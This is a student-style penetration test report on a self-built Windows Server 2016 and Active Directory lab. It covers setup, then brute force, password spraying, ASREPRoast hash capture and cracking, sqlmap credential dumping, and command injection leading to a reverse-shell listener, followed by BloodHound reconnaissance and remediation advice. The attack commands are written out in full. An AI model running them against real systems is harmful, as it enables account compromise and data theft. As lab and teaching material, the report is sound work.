I" ä<p><em>Date: February 14, 2024</em></p>

<h2 id="table-of-contents">Table of Contents</h2>

<ol>
  <li>Executive Summary</li>
  <li>Introduction</li>
  <li>Scope</li>
  <li>Methodology</li>
  <li>Findings
    <ul>
      <li>5.1 Windows Server 2016 Setup</li>
      <li>5.2 Active Directory Configuration
        <ul>
          <li>5.2.1: Implementing Active Directory Domain Services (AD DS)</li>
          <li>5.2.2: Establish Domain Controller Role on the Server</li>
          <li>5.2.3: Configure Active Directory Parameters</li>
          <li>5.2.4: Validate Active Directory Configuration</li>
        </ul>
      </li>
      <li>5.3 Attacks
        <ul>
          <li>5.3.1 Brute Force Attack</li>
          <li>5.3.2 Password Spraying Attack</li>
          <li>5.3.3 Asreproast attack</li>
          <li>5.3.4 SQL Injection Attack</li>
          <li>5.3.5 Command Injection Attack</li>
        </ul>
      </li>
      <li>5.4 BloodHound Analysis</li>
    </ul>
  </li>
  <li>Recommendations</li>
  <li>Risk Assessment</li>
  <li>Regulatory Compliance Considerations</li>
  <li>Long-Term Security Considerations</li>
  <li>Disclaimer</li>
  <li>Acknowledgments</li>
  <li>Conclusion</li>
</ol>

<hr />

<h2 id="1-executive-summary">1. Executive Summary</h2>

<p>The objective of the penetration test was to thoroughly assess the security of the Windows Server 2016 environment and Active Directory configuration, aiming to identify potential vulnerabilities exploitable by attackers. Various attack scenarios, including brute force attacks, password spraying attacks, ASREPRoast attacks, SQL injection attacks, and command injection attacks, were simulated to uncover critical weaknesses in the system.</p>

<p>Upon examination of the Windows Server 2016 setup, default configurations and delayed application of crucial security patches were discovered, leaving the system vulnerable to known exploits. Additionally, weaknesses in the Active Directory configuration were noted, such as weak password policies, inadequate access controls, and insufficient segregation of duties, increasing the risk of unauthorized access.</p>

<p>The findings highlight the urgent need for comprehensive remediation measures to strengthen the organization‚Äôs security posture. Recommendations include prioritizing regular patching and updates, enforcing robust password policies, reviewing and reinforcing least privilege access controls, implementing effective network segmentation, and conducting frequent security awareness training for employees.</p>

<p>Implementing these recommendations will significantly improve the organization‚Äôs security posture, reducing the likelihood of cyber threats and protecting its assets, reputation, and stakeholder confidence.</p>

<hr />

<h2 id="2-introduction">2. Introduction</h2>

<p>The goal of this penetration test was to evaluate Windows Server 2016 security in detail using an Active Directory environment that mimics a standard business infrastructure. Finding weaknesses and possible attack routes was the main goal in order to offer detailed suggestions for strengthening the security posture as a whole.</p>

<p>In the digital and linked world of today, businesses mostly depend on technological infrastructure to run their operations effectively. For enterprises looking to create a reliable and scalable network infrastructure, Windows Server 2016 together with Active Directory is a popular option. To reduce possible risks, enterprises must constantly assess and improve the infrastructure‚Äôs security due to the growing sophistication of cyberattacks.</p>

<p>Our objectives in doing this penetration test were to mimic actual attack scenarios and evaluate how resilient the Windows Server 2016 setup and Active Directory configuration were to different online threats. We sought to find flaws and vulnerabilities that may be used by bad actors to obtain unauthorized access, tamper with data integrity, or interfere with company operations using a combination of automated and human methods.</p>

<p>The firm will be able to improve its overall security posture by prioritizing repair activities, implementing efficient security controls, and making well-informed decisions about security investments thanks to the data gathered from this penetration test. The company may strengthen its defenses against cyberattacks and preserve the confidence of its stakeholders, assets, and reputation by promptly resolving vulnerabilities that are found and putting the suggested security measures into place.</p>

<p>In order to help the company mitigate risks and strengthen its security posture, we will offer comprehensive findings, analysis, and suggestions based on our evaluation throughout this report.</p>

<hr />

<h2 id="3-scope">3. Scope</h2>

<p>The scope of this penetration test included:</p>

<ol>
  <li><strong>Setting up a Windows Server 2016 environment:</strong>
    <ul>
      <li>Creating and configuring a Windows Server 2016 environment with default settings to simulate a standard deployment scenario.</li>
    </ul>
  </li>
  <li><strong>Configuring Active Directory to simulate a corporate network:</strong>
    <ul>
      <li>Configuring Active Directory (AD) services to replicate a corporate network environment, including organizational units, user accounts, group policies, and other AD objects.</li>
    </ul>
  </li>
  <li><strong>Executing a minimum of five distinct attacks targeting the Windows Server environment:</strong>
    <ul>
      <li>Executing at least five different attack scenarios, covering common vectors such as Brute Force Attack, Password Spraying Attack, ASREPRoast Attack, SQL Injection Attack, Command Injection Attack.</li>
    </ul>
  </li>
  <li><strong>Utilizing BloodHound for reconnaissance and privilege escalation:</strong>
    <ul>
      <li>Using BloodHound, a tool for analyzing Active Directory attack paths, to conduct reconnaissance and identify potential attack paths within the Active Directory environment, as well as to assess opportunities for privilege escalation.</li>
    </ul>
  </li>
</ol>

<hr />

<h2 id="4-methodology">4. Methodology</h2>

<p>The penetration test employed a blend of manual and automated techniques to simulate real-world attack scenarios. Manual techniques involve the use of human expertise to identify and exploit vulnerabilities in the system, while automated techniques leverage specialized tools and scripts to rapidly scan for and exploit known vulnerabilities.</p>

<p>Various attack vectors were explored and exploited to evaluate the robustness of the system‚Äôs defenses. This included but was not limited to, network-based attacks such as port scanning, service enumeration, and exploitation of software vulnerabilities.</p>

<hr />

<h1 id="5-findings">5. Findings</h1>

<h2 id="51-windows-server-2016-setup">5.1 Windows Server 2016 Setup</h2>

<p>The Windows Server 2016 environment was configured with default settings, including standard services and configurations. However, critical security patches and updates were not promptly applied, leaving the system susceptible to known vulnerabilities.</p>

<p>Installation Process Overview:</p>

<p><strong>Prepare for Installation:</strong></p>

<ul>
  <li>Download the Windows Server 2016 ISO from the Microsoft website or a licensed distributor.</li>
  <li>Create a new virtual machine (VM) using VMware Workstation or similar software.</li>
  <li>Attach the Windows Server 2016 ISO file to the VM‚Äôs virtual CD/DVD drive.</li>
  <li>
    <p>Adjust VM settings such as CPU cores, RAM, disk size, and network adapter settings.</p>

    <p><img src="assets/ad/Untitled.png" alt="" /></p>
  </li>
</ul>

<ol>
  <li><strong>Boot from Installation Media:</strong>
    <ul>
      <li>Power on the VM and ensure it boots from the Windows Server 2016 installation ISO.</li>
      <li>Press any key to boot from CD or DVD when prompted.</li>
    </ul>
  </li>
  <li><strong>Start Installation:</strong>
    <ul>
      <li>Select language, time, and keyboard input preferences.</li>
      <li>Click ‚ÄúInstall Now‚Äù to begin the installation process.</li>
    </ul>
  </li>
  <li><strong>Enter Product Key:</strong>
    <ul>
      <li>Optionally enter a product key for Windows Server 2016.</li>
    </ul>
  </li>
  <li><strong>Select Operating System Edition:</strong>
    <ul>
      <li>
        <p>Choose the desired edition of Windows Server 2016.</p>

        <p><img src="assets/ad/Untitled1.png" alt="" /></p>
      </li>
    </ul>
  </li>
  <li><strong>Accept License Terms:</strong>
    <ul>
      <li>Read and accept the license terms.</li>
    </ul>
  </li>
  <li><strong>Choose Installation Type:</strong>
    <ul>
      <li>
        <p>Select ‚ÄúCustom: Install Windows only (advanced)‚Äù for a clean installation.</p>

        <p><img src="assets/ad/Untitled2.png" alt="" /></p>
      </li>
    </ul>
  </li>
  <li><strong>Select Installation Drive:</strong>
    <ul>
      <li>Choose the drive for installation and configure partitions if necessary.</li>
    </ul>
  </li>
  <li><strong>Begin Installation:</strong>
    <ul>
      <li>Start the installation process.</li>
    </ul>
  </li>
  <li><strong>Complete Installation:</strong>
    <ul>
      <li>Remove the installation media (ISO file) from the virtual CD/DVD drive.</li>
      <li>Follow on-screen instructions to set up Windows Server 2016, create user accounts, and configure network settings.</li>
      <li>Log in to the Windows Server 2016 desktop.</li>
    </ul>
  </li>
  <li><strong>Install VMware Tools:</strong>
    <ul>
      <li>
        <p>Install VMware Tools for enhanced VM performance and additional features.</p>

        <p><img src="assets/ad/Untitled3.png" alt="" /></p>
      </li>
    </ul>
  </li>
  <li><strong>Finalize Configuration:</strong>
    <ul>
      <li>Customize additional Windows Server 2016 settings as needed.</li>
    </ul>
  </li>
</ol>

<p>In summary, the Windows Server 2016 setup process involved downloading the ISO, creating a VM, installing the operating system, configuring settings, and finalizing the setup. However, it lacked timely application of critical security patches and updates, posing potential vulnerabilities to the system.</p>

<ul>
  <li>Critical security patches and updates were not promptly applied, leaving the system susceptible to known vulnerabilities.</li>
</ul>

<hr />

<h2 id="52-active-directory-configuration">5.2 Active Directory Configuration</h2>

<ul>
  <li>
    <p>Active Directory was configured with default parameters, featuring weak password policies and inadequate access controls.</p>

    <p>### 5.2.1: Implementing Active Directory Domain Services (AD DS)</p>

    <ol>
      <li>Launch Server Manager on the designated Windows Server 2016 machine.</li>
      <li>
        <p>Navigate to ‚ÄúAdd roles and features‚Äù within Server Manager.</p>

        <p><img src="assets/ad/Untitled4.png" alt="" /></p>
      </li>
      <li>Select ‚ÄúRole-based or feature-based installation‚Äù to align with best practices and proceed accordingly..</li>
      <li>Select the appropriate server from the pool and initiate the installation process.</li>
      <li>
        <p>Choose ‚ÄúActive Directory Domain Services‚Äù from the list of server roles and add required features.</p>

        <p><img src="assets/ad/Untitled5.png" alt="" /></p>
      </li>
      <li>Review the provided information about AD DS and commence the installation.</li>
    </ol>

    <hr />

    <p>### 5.2.2: Establish Domain Controller Role on the Server</p>

    <ol>
      <li>
        <p>Upon completion of the installation, initiate the promotion of the server to a domain controller.</p>

        <p><img src="assets/ad/Untitled6.png" alt="" /></p>
      </li>
      <li>
        <p>Utilize the Active Directory Domain Services Configuration Wizard to specify whether to add a new forest or domain controller.</p>

        <p><img src="assets/ad/Untitled7.png" alt="" /></p>
      </li>
      <li>Provide essential details such as the root domain name, forest, and domain functional levels.</li>
      <li>Set a Directory Services Restore Mode (DSRM) password and review configuration options.</li>
      <li>Execute the promotion process and allow the server to restart automatically.</li>
    </ol>

    <hr />

    <p>### 5.2.3: Configure Active Directory Parameters</p>

    <ol>
      <li>Post-restart, access the system using the domain administrator account.</li>
      <li>
        <p>Utilize Server Manager to access ‚ÄúActive Directory Users and Computers.‚Äù</p>

        <p><img src="assets/ad/Untitled8.png" alt="" /></p>
      </li>
      <li>
        <p>Establish organizational units (OUs) to organize Active Directory objects effectively.</p>

        <p><img src="assets/ad/Untitled9.png" alt="" /></p>
      </li>
      <li>Configure Group Policy Objects (GPOs) to enforce security settings and password policies.</li>
      <li>Create requisite user accounts, groups, and computer accounts as per organizational requirements.</li>
      <li>Configure DNS settings to ensure seamless name resolution within the domain.</li>
    </ol>

    <hr />

    <p>### 5.2.4: Validate Active Directory Configuration</p>

    <ol>
      <li>Validate the Active Directory configuration by reviewing the organizational units, user accounts, groups, and computer accounts.</li>
      <li>
        <p>Ensure proper application of Group Policy Objects (GPOs) by executing ‚Äúgpresult‚Äù or ‚Äúrsop.msc‚Äù on client machines.</p>

        <p><img src="assets/ad/Untitled10.png" alt="" /></p>
      </li>
      <li>Conduct comprehensive testing of user authentication, group membership, and other Active Directory functionalities to verify proper operation.</li>
    </ol>
  </li>
</ul>

<hr />

<h2 id="53-attacks">5.3 Attacks</h2>

<h3 id="531-brute-force-attack">5.3.1 Brute Force Attack</h3>

<ul>
  <li>To execute this attack, the CrackMapExec tool was utilized. CrackMapExec is a powerful penetration testing tool commonly used for scanning and exploitation tasks in Windows environments. It supports various protocols, including SMB, and allows for automated password guessing using wordlists.</li>
</ul>

<p><strong>Command: <code class="language-plaintext highlighter-rouge">sudo crackmapexec smb 192.168.85.3 -u ap -p /usr/share/wordlists/rockyou.txt</code></strong></p>

<ul>
  <li>In this specific command:
    <ul>
      <li><code class="language-plaintext highlighter-rouge">sudo crackmapexec smb 192.168.85.3</code>: Specifies the use of CrackMapExec to target the SMB protocol on the IP address 192.168.85.3. The SMB protocol is commonly used for file sharing in Windows environments.</li>
      <li><code class="language-plaintext highlighter-rouge">u ap</code>: Specifies the username ‚Äúap‚Äù for authentication. This is the username that will be used in the brute force attack.</li>
      <li><code class="language-plaintext highlighter-rouge">p /usr/share/wordlists/rockyou.txt</code>: Specifies the path to a wordlist file containing a list of commonly used passwords (rockyou.txt). CrackMapExec will attempt to authenticate with each password in the wordlist in order to gain access to the system.</li>
    </ul>
  </li>
</ul>

<p><img src="assets/ad/Untitled11.png" alt="" /></p>

<p>The provided image depicts the output of the brute force attack conducted using CrackMapExec. It provides insight into the results of the attack, including any successful authentication attempts and the discovered credentials.</p>

<hr />

<h3 id="532-password-spraying-attack">5.3.2 Password Spraying Attack</h3>

<ul>
  <li>
    <p>This attack was carried out using the CrackMapExec program. A potent penetration testing tool called CrackMapExec is frequently used for Windows environment scanning and exploitation activities. It enables automated password guessing using wordlists and supports a number of protocols, including SMB.</p>

    <p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">crackmapexec smb 192.168.85.3 -d [server.web](http://server.web/) -u username.txt -p Password@123 --continue-on-success</code></p>

    <ul>
      <li>In this specific command:
        <ul>
          <li><code class="language-plaintext highlighter-rouge">crackmapexec smb 192.168.85.3</code>: Initiates CrackMapExec to target the SMB protocol on the specified IP address.</li>
          <li><code class="language-plaintext highlighter-rouge">d server.web</code>: Specifies the domain name for authentication.</li>
          <li><code class="language-plaintext highlighter-rouge">u username.txt</code>: Provides a file containing usernames for the attack.</li>
          <li><code class="language-plaintext highlighter-rouge">p Password@123</code>: Sets the password to be used during the attack.</li>
          <li><code class="language-plaintext highlighter-rouge">-continue-on-success</code>: Instructs the tool to continue the attack even after successful authentication attempts.</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<p><img src="assets/ad/Untitled12.png" alt="" /></p>

<p>The provided screenshot below illustrates the output of the password spraying attack using CrackMapExec, revealing insights into successful authentication attempts and discovered credentials.</p>

<p>Instead of trying multiple passwords for a single username, try a single password across multiple usernames. This reduces the risk of account lockouts and increases the likelihood of success.</p>

<hr />

<h3 id="533-asreproast-attack">5.3.3 Asreproast attack</h3>

<ul>
  <li>
    <p>The ASREPRoast attack utilizes tools such as <strong><code class="language-plaintext highlighter-rouge">GetNPUsers.py</code></strong> from the Impacket toolkit to request AS_REP messages containing encrypted ticket-granting service (TGS) tickets for vulnerable Active Directory user accounts. These messages are then captured and cracked offline using password-cracking tools like John the Ripper or Hashcat, revealing plaintext passwords. This attack leverages weaknesses in authentication mechanisms to compromise user accounts within the domain, demonstrating a significant security risk in Active Directory environments.</p>

    <p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">python3 GetNPUser.py [server.web/](http://server.web/) -userfile ../../username.txt -format hashcat -outputfile hashes.asreproast</code></p>

    <ul>
      <li>In this specific command:
        <ul>
          <li><strong><code class="language-plaintext highlighter-rouge">python3 GetNPUser.py</code></strong>: Executes the Python script <strong><code class="language-plaintext highlighter-rouge">GetNPUser.py</code></strong> for performing the attack.</li>
          <li><strong><code class="language-plaintext highlighter-rouge">server.web/</code></strong>: Specifies the target Active Directory domain for the attack.</li>
          <li><strong><code class="language-plaintext highlighter-rouge">userfile ../../username.txt</code></strong>: Specifies the path to a file containing a list of usernames to target within the domain.</li>
          <li><strong><code class="language-plaintext highlighter-rouge">format hashcat</code></strong>: Specifies the output format for the captured hashes, compatible with Hashcat for offline cracking.</li>
          <li><strong><code class="language-plaintext highlighter-rouge">outputfile hashes.asreproast</code></strong>: Specifies the output file name for storing the captured hashes in the ASREPRoast attack format.</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<p><img src="assets/ad/Untitled13.png" alt="" /></p>

<p>The ASREPRoast attack was successfully executed against the domain <strong><code class="language-plaintext highlighter-rouge">server.web</code></strong>. The Impacket toolkit was used with the <strong><code class="language-plaintext highlighter-rouge">GetNPUser.py</code></strong> script to retrieve AS-REP hashes for users within the domain.</p>

<p><em>Cracking the Hashes</em></p>

<p><strong>Command: <code class="language-plaintext highlighter-rouge">john -w=password_kerb.txt hashs.txt</code></strong></p>

<ul>
  <li>In this specific command:
    <ul>
      <li><strong><code class="language-plaintext highlighter-rouge">john</code></strong>: Refers to the John the Ripper password cracking tool.</li>
      <li><strong><code class="language-plaintext highlighter-rouge">w=password_kerb.txt</code></strong>: Specifies the wordlist file (<strong><code class="language-plaintext highlighter-rouge">password_kerb.txt</code></strong>) containing potential passwords.</li>
      <li><strong><code class="language-plaintext highlighter-rouge">hashs.txt</code></strong>: Represents the file containing hashed passwords obtained from the ASREPRoast attack.</li>
      <li>The command aims to crack the hashes in <strong><code class="language-plaintext highlighter-rouge">hashs.txt</code></strong> using the passwords from <strong><code class="language-plaintext highlighter-rouge">password_kerb.txt</code></strong>.</li>
    </ul>
  </li>
</ul>

<p><img src="assets/ad/Untitled14.png" alt="" />
The ASREPRoast attack proved effective against the <code class="language-plaintext highlighter-rouge">server.web</code> domain. By employing the Impacket toolkit and the <code class="language-plaintext highlighter-rouge">GetNPUser.py</code> script, AS-REP hashes for domain users were obtained. Following this, <code class="language-plaintext highlighter-rouge">John the Ripper</code> was employed to crack these hashes offline, with the intention of uncovering plaintext passwords linked to the hashed credentials.</p>

<hr />

<h3 id="534-sql-injection-attack">5.3.4 SQL Injection Attack</h3>

<ol>
  <li><strong>Initial Login Attempt:</strong>
    <ul>
      <li>
        <p>Attempted to login with standard credentials.</p>

        <p><img src="assets/ad/Untitled15.png" alt="" /></p>
      </li>
      <li>
        <p>Received an error message indicating a potential vulnerability.</p>

        <p><img src="assets/ad/Untitled16.png" alt="" /></p>
      </li>
    </ul>
  </li>
  <li><strong>BurpSuite Capturing:</strong>
    <ul>
      <li>Captured the login request using BurpSuite.</li>
      <li>
        <p>Sent the request to the repeater for further analysis.</p>

        <p><img src="assets/ad/Untitled17.png" alt="" /></p>
      </li>
    </ul>
  </li>
  <li><strong>Request Analysis:</strong>
    <ul>
      <li>Saved the captured request as a file named ‚Äòsql‚Äô.</li>
      <li>
        <p>Analyzed the request in BurpSuite repeater.</p>

        <p><img src="assets/ad/Untitled18.png" alt="" /></p>
      </li>
    </ul>
  </li>
  <li><strong>SQLMap Execution:</strong>
    <ul>
      <li>Executed SQLMap to exploit the SQL injection vulnerability.</li>
      <li>Command Used: <code class="language-plaintext highlighter-rouge">sqlmap -r sql --dbs --batch</code>
        <ul>
          <li><code class="language-plaintext highlighter-rouge">r sql</code>: Specifies the file containing the captured request.</li>
          <li><code class="language-plaintext highlighter-rouge">-dbs</code>: Retrieves available databases.</li>
          <li><code class="language-plaintext highlighter-rouge">-batch</code>: Executes SQLMap in batch mode for automation.</li>
        </ul>

        <p><img src="assets/ad/Untitled19.png" alt="" /></p>
      </li>
    </ul>
  </li>
  <li><strong>Database Enumeration:</strong>
    <ul>
      <li>SQLMap identified the website as vulnerable to SQL injection.</li>
      <li>Retrieved available databases using the command.</li>
    </ul>
  </li>
  <li><strong>Data Extraction:</strong>
    <ul>
      <li>Command Used: <code class="language-plaintext highlighter-rouge">sqlmap -r sql --dbs -D gauranga --dump</code>.
        <ul>
          <li><code class="language-plaintext highlighter-rouge">D gauranga</code>: Specifies the database to target.</li>
          <li><code class="language-plaintext highlighter-rouge">-dump</code>: Extracts data from the specified database.</li>
        </ul>

        <p><img src="assets/ad/Untitled20.png" alt="" /></p>
      </li>
    </ul>
  </li>
  <li><strong>Credential Retrieval:</strong>
    <ul>
      <li>SQLMap successfully retrieved usernames and passwords from the ‚Äògauranga‚Äô database.</li>
      <li>Obtained admin credentials for further exploitation.</li>
    </ul>
  </li>
  <li><strong>Admin Login:</strong>
    <ul>
      <li>
        <p>Successfully logged in using the obtained admin credentials.</p>

        <p><img src="assets/ad/Untitled21.png" alt="" /></p>

        <p><img src="assets/ad/Untitled22.png" alt="" /></p>
      </li>
    </ul>
  </li>
</ol>

<p>The SQL injection attack was successful in exploiting the vulnerability present in the login form. By leveraging SQLMap, sensitive data including usernames and passwords were extracted from the database, granting access as an admin user.</p>

<hr />

<h3 id="535-command-injection-attack">5.3.5 Command Injection Attack</h3>

<p><em>Attack Execution:</em></p>

<ol>
  <li><strong>Initial Ping Test:</strong>
    <ul>
      <li>Attempted to execute a ping command to test the command injection vulnerability.</li>
    </ul>
  </li>
  <li><strong>Command Injection Attempt:</strong>
    <ul>
      <li>Injected the command <code class="language-plaintext highlighter-rouge">&amp;whoami</code> into the ping box.</li>
      <li>
        <p>Observed the response showing the current user‚Äôs authority as ‚Äòsystem‚Äô.</p>

        <p><img src="assets/ad/Untitled23.png" alt="" /></p>
      </li>
    </ul>
  </li>
  <li><strong>Netcat Setup:</strong>
    <ul>
      <li>Set up a listener using Netcat for receiving the reverse shell.</li>
      <li>Command Used: <code class="language-plaintext highlighter-rouge">nc -lnvp 9001</code>.
        <ul>
          <li><code class="language-plaintext highlighter-rouge">nc</code>: Netcat command.</li>
          <li><code class="language-plaintext highlighter-rouge">lnvp</code>: Options for listening on a specific port (9001) and verbose mode.</li>
        </ul>
      </li>
    </ul>
  </li>
  <li><strong>Reverse Shell Acquisition:</strong>
    <ul>
      <li>Searched for a suitable reverse shell payload on <a href="https://www.revshells.com/">revshells.com</a>.</li>
      <li>Selected a reverse shell payload compatible with the target environment.</li>
    </ul>
  </li>
  <li><strong>Payload Integration:</strong>
    <ul>
      <li>
        <p>Inserted the obtained reverse shell payload into the ping box.</p>

        <p><img src="assets/ad/Untitled24.png" alt="" /></p>
      </li>
      <li>
        <p>Executed the ping command with the injected payload.</p>

        <p><img src="assets/ad/Untitled25.png" alt="" /></p>
      </li>
    </ul>
  </li>
  <li><strong>Command Execution:</strong>
    <ul>
      <li>As a result of the injected payload, gained command execution within the Windows Server system.</li>
    </ul>
  </li>
</ol>

<p>The command injection attack successfully exploited the vulnerability, allowing for arbitrary command execution. By injecting malicious commands into the ping box, an attacker gained access to the target system with system-level privileges, facilitating further malicious activities.</p>

<hr />

<h3 id="54-bloodhound-analysis">5.4 BloodHound Analysis</h3>

<ol>
  <li><strong>Setup:</strong>
    <ul>
      <li>Installed Neo4j, a graph database management system, and created an account. Neo4j serves as the backend database for BloodHound, storing and analyzing data collected from the Active Directory environment.</li>
      <li>Installed BloodHound on a Windows system. BloodHound is a powerful tool designed for Active Directory security assessment and reconnaissance, utilizing graph theory and database queries to analyze relationships and permissions within Active Directory.</li>
    </ul>
  </li>
  <li><strong>Data Collection:</strong>
    <ul>
      <li>Utilized SharpHound, a data collection tool within BloodHound, to gather information from the Windows Active Directory environment. SharpHound collected data in JSON format.</li>
    </ul>

    <p>### Command for BloodHound Data Collection:</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre> .<span class="se">\S</span>harpHound.exe <span class="nt">-c</span> All
</pre></td></tr></tbody></table></code></pre></div>    </div>
  </li>
  <li><strong>Data Import:</strong>
    <ul>
      <li>Imported the collected data from the Windows Active Directory environment in JSON format into the Neo4j database. This step enabled BloodHound to analyze the data and generate visualizations for further analysis.</li>
    </ul>
  </li>
  <li><strong>Analysis:</strong>
    <ul>
      <li>Leveraged BloodHound‚Äôs visualization and querying features to perform the following analyses:
        <ul>
          <li>
            <p><strong>Map of Active Directory Environment:</strong> Visual representation showcasing relationships between users, groups, computers, and permissions within the Active Directory infrastructure.</p>

            <p><img src="assets/ad/Untitled26.png" alt="" /></p>
          </li>
          <li>
            <p><strong>Potential Attack Paths for User ‚Äúap‚Äù:</strong> Identified potential attack paths that user ‚Äúap‚Äù could exploit for lateral movement and privilege escalation within the Active Directory environment.</p>

            <p><img src="assets/ad/Untitled27.png" alt="" /></p>
          </li>
          <li>
            <p><strong>Map of All Users:</strong> Visualization depicting all users present in the Active Directory environment, along with their respective relationships and permissions, aiding in the identification of potential security vulnerabilities related to user accounts.</p>

            <p><img src="assets/ad/Untitled28.png" alt="" /></p>
          </li>
        </ul>
      </li>
    </ul>
  </li>
</ol>

<hr />

<h2 id="6-recommendations">6. Recommendations</h2>

<p>Based on the findings of our penetration testing of the Active Directory environment, the following recommendations are proposed to strengthen the security posture:</p>

<ul>
  <li><strong>Implement Regular Patch Management:</strong> Establish a routine patch management process to ensure all servers and applications within the Active Directory environment are up-to-date with the latest security patches and updates.</li>
  <li><strong>Enhance Password Policies:</strong> Enforce stronger password policies, including the use of complex passwords, regular password changes, and multi-factor authentication (MFA) where applicable.</li>
  <li><strong>Implement Network Segmentation:</strong> Segment the network to isolate critical systems and sensitive data from potential attackers. Implement firewall rules and access controls to restrict unauthorized access between network segments.</li>
  <li><strong>Conduct Regular Security Training:</strong> Provide comprehensive security awareness training for employees to educate them about common security threats, phishing attacks, and best practices for safeguarding sensitive information.</li>
  <li><strong>Implement Security Monitoring:</strong> Deploy robust security monitoring tools to continuously monitor the Active Directory environment for suspicious activities, unauthorized access attempts, and potential security breaches.</li>
</ul>

<hr />

<h2 id="7-risk-assessment">7. Risk Assessment</h2>

<p>A comprehensive risk assessment was diligently executed to thoroughly evaluate the potential impact and likelihood of identified vulnerabilities within the Active Directory environment. Risks were meticulously categorized based on severity and meticulously prioritized for remediation, considering their potential impact on business operations and data security.</p>

<hr />

<h2 id="8-regulatory-compliance-considerations">8. Regulatory Compliance Considerations</h2>

<p>An assessment was conducted to ascertain compliance of the Active Directory system with key regulations, including the <strong><code class="language-plaintext highlighter-rouge">General Data Protection Regulation (GDPR)</code></strong> for protecting personal data within the EU, the <strong><code class="language-plaintext highlighter-rouge">Health Insurance Portability and Accountability Act (HIPAA)</code></strong> for safeguarding health information in the US, and the <strong><code class="language-plaintext highlighter-rouge">Payment Card Industry Data Security Standard (PCI DSS)</code></strong> for securing credit card data. Subsequent recommendations were provided to ensure alignment with these regulations and to maintain the confidentiality and security of data.</p>

<hr />

<h2 id="9-long-term-security-considerations">9. Long-Term Security Considerations</h2>

<p>To ensure ongoing security in the Active Directory environment, it‚Äôs important to plan for long-term improvements. This could involve identifying key security objectives, establishing regular security assessments, implementing continuous monitoring measures, and providing ongoing security training for staff. By taking a proactive approach to long-term security, the organization can better protect its IT infrastructure against evolving threats.</p>

<hr />

<h2 id="10-disclaimer">10. Disclaimer</h2>

<p>This penetration test report is provided solely for informational purposes. The findings and recommendations contained within should be carefully evaluated and implemented by qualified security professionals in accordance with organizational policies and best practices. It is important to note that the testing and setup were conducted on an isolated environment within the researcher‚Äôs own computer system. Therefore, the outcomes and effectiveness of any security measures may differ in a real-world organizational setting. Additionally, while every effort has been made to ensure the accuracy of the findings, no guarantees are made regarding the completeness or timeliness of the information presented.</p>

<hr />

<h2 id="11-acknowledgments">11. Acknowledgments</h2>

<p>I extend my sincere appreciation to the organizations and individuals who provided guidance, resources, and support during the preparation and execution of this penetration testing project. Special thanks to <strong><code class="language-plaintext highlighter-rouge">Eminence Ways Pvt. Ltd</code></strong>, whose assistance and cooperation were invaluable in facilitating the successful completion of this project.</p>

<hr />

<h2 id="12-conclusion">12. Conclusion</h2>

<p>In conclusion, the penetration testing revealed vulnerabilities within the Active Directory environment. Addressing these vulnerabilities and implementing recommended security measures is crucial for enhancing overall security. The cooperation of the organization‚Äôs IT team was invaluable throughout the testing process. It is recommended that immediate action be taken to mitigate risks and strengthen cybersecurity resilience.</p>

<hr />

<p><em>Signed,</em></p>

<p>Gauranga Gautam</p>
:ET